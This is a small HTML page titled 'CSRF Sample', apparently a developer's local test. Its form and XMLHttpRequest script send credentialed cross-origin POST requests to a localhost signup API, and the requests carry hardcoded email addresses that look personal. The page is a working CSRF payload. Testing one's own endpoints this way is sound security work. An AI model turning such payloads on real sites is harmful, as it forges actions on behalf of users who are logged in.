<html>
  <body>
    <h1>CSRF Sample</h1>

    <form id="form1" action="https://localhost:3336/api/v1/user/signup" method="POST">
      <input type="submit" name="email" value="kou0407hei@gmail.com" />
    </form>
    <button id="button1" type="submit">Submit Form</button>
  </body>
  <style>
    input {
      cursor:pointer;
    }
  </style>

  <script>
  const form1 = document.getElementById('form1')
  const button1 = document.getElementById('button1');


  console.log("form1", form1);

  function CSRF1() {
    console.log("form submitted");
    document.forms[0].submit();
  }

  function CSRF2() {
    const data = JSON.stringify({"email": "kohei.maruyoshi@bajji.life"});
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://localhost:3336/api/v1/user/signup");
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.setRequestHeader("X-Form", "http://localhost:3500");
    xhr.withCredentials = true;

    xhr.send(data)

    console.log('button clicked');
  }



  form1.addEventListener('click', CSRF1);
  button1.addEventListener('click', CSRF2);
  </script>
</html>

